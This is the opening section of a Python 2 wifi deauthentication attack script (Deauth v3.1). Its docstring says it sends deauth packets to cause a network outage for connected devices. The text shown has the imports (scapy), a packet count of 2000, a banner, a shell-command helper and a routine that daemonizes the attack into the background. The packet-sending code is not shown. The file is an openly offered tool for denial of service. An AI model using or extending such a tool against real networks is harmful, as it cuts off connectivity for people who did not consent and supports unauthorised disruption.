#!/usr/bin/env python2
"""
Sends deauth packets to a wifi network which results network outage for connected devices.
"""
__author__ ="Veerendra Kakumanu (veerendra2)"
__license__ = "Apache 2.0"
__version__ = "3.1"
__maintainer__ = "Veerendra Kakumanu"
__credits__ = ["Franz Kafka"]

import os
import sys
import re 
import logging
import subprocess
import argparse
import signal

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    import scapy.all
except ImportError:
    print "[-] scapy module not found. Please install it by running 'sudo apt-get install python-scapy -y'"
    exit(1)

scapy.all.conf.verbose = False
PID_FILE = "/var/run/deauth.pid"  
WIRELESS_FILE = "/proc/net/wireless"
DEV_FILE = "/proc/net/dev"
PACKET_COUNT = 2000
GREEN = '\033[92m'
RED = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
PATTREN = {"MAC Address": 'Address:(.*)',
            "ESSID": 'ESSID:(.*)', 
            "ID": '(.*) - Address'}


def banner():
    print "\n+----------------------------------------------------------------+"
    print "|Deauth v3.1                                                     |" 
    print "|Coded by Veerendra Kakumanu (veerendra2)                        |"
    print "|Blog: https://veerendra2.github.io/wifi-deathentication-attack/ |"
    print "|Repo: https://github.com/veerendra2/wifi-deauth-attack          |"
    print "+----------------------------------------------------------------+\n"


def execute(cmd, verbose=False):
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out = []
    while True: 
        line = p.stdout.readline()
        out.append(line)
        if verbose:
            print line,
        if not line and p.poll() is not None:
            break
    if p.returncode != 0:
        print p.stderr.read().strip() 
        return 1
    else:
        return ''.join(out).strip()


def daemonize():
    if os.fork():
        os._exit(0)
    os.chdir("/")
    os.umask(0o22)
    os.setsid() 
    os.umask(0)
    if os.fork():
        os._exit(0)
    stdin = open(os.devnull)
    stdout = open(os.devnull, 'w')
    os.dup2(stdin.fileno(), 0)
    os.dup2(stdout.fileno(), 1) 
    os.dup2(stdout.fileno(), 2)
    stdin.close()
    stdout.close()
    os.umask(0o22)
    for fd in xrange(3, 1024):
        try:
            os.close(fd)
        except OSError:
            pass
